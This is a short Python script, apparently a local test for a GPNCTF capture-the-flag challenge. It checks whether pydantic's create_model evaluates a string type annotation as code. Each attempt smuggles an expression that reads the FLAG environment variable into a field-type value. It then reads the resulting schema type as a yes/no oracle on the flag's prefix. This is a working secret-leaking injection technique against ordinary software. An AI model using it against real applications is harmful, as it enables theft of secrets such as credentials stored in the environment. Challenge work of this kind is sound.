from pydantic import create_model
import os
os.environ['FLAG'] = 'GPNCTF{test_flag}'

try:
    Blueprint = create_model("Test", foo="str if __import__('os').environ['FLAG'].startswith('GPN') else int")
    print("GPN:", Blueprint.model_json_schema()['properties']['foo']['type'])
except Exception as e:
    import traceback
    traceback.print_exc()

try:
    Blueprint = create_model("Test2", foo="str if __import__('os').environ['FLAG'].startswith('ABC') else int")
    print("ABC:", Blueprint.model_json_schema()['properties']['foo']['type'])
except Exception as e:
    import traceback
    traceback.print_exc()

